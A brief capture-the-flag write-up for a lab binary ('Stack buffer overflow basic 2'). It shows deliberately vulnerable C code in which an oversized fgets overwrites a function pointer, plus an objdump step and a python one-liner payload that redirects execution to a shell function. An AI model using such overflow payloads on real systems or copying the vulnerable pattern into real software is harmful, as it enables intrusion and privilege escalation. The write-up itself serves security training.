# ELF x86 - Stack buffer overflow basic 2 

source 
```
    #include <stdio.h>
    #include <stdlib.h>
    #include <sys/types.h>
    #include <unistd.h>
     
    void shell() {
        setreuid(geteuid(), geteuid());
        system("/bin/bash");
    }
     
    void sup() {
        printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
    }
     
    void main()
    {
        int var;
        void (*func)()=sup;
        char buf[128];
        fgets(buf,133,stdin);
        func();
    }

```

This is also a basic bufferoverflow problem where we have to overflow the buffer with the address of the shell function.address of the shell function can be analyzed by
```
objdump -d ./ch15
```
Analyzing using objdump gives us the address of the shell function which can be used after the dummy data of 128 bytes to pop the shell

payload
```
(python -c "print('A'*128+<address of the shell function>)";cat) | ./ch15
```

here the cat function is used to stop the exploit at the shell
